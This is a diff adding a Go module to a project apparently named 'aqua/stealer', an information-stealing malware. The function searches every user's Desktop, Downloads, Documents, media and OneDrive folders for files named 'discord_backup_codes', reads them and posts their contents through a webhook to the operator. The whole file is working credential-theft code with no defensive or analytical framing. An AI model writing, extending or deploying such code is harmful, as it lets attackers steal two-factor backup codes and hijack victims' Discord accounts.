@@ -1,0 +1,57 @@
+package discodes
+
+import (
+	"os"
+	"path/filepath"
+	"strings"
+
+	"github.com/aqua/stealer/utils/hardware"
+	"github.com/aqua/stealer/utils/requests"
+)
+
+func Run(wh *requests.DualWebhook) {
+	for _, user := range hardware.GetUsers() {
+		for _, dir := range []string{
+			filepath.Join(user, "Desktop"),
+			filepath.Join(user, "Downloads"),
+			filepath.Join(user, "Documents"),
+			filepath.Join(user, "Videos"),
+			filepath.Join(user, "Pictures"),
+			filepath.Join(user, "Music"),
+			filepath.Join(user, "OneDrive"),
+		} {
+			if _, err := os.Stat(dir); err != nil {
+				continue
+			}
+
+			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
+				if err != nil {
+					return nil
+				}
+				if info.IsDir() {
+					return nil
+				}
+				if info.Size() > 2*1024*1024 {
+					return nil
+				}
+				if !strings.HasPrefix(info.Name(), "discord_backup_codes") {
+					return nil
+				}
+				data, err := os.ReadFile(path)
+				if err != nil {
+					return nil
+				}
+				wh.Send(map[string]interface{}{
+					"content": "`" + path + "`",
+					"embeds": []map[string]interface{}{
+						{
+							"title":       "Discord Backup Codes",
+							"description": "```" + string(data) + "```",
+						},
+					},
+				})
+				return nil
+			})
+		}
+	}
+}
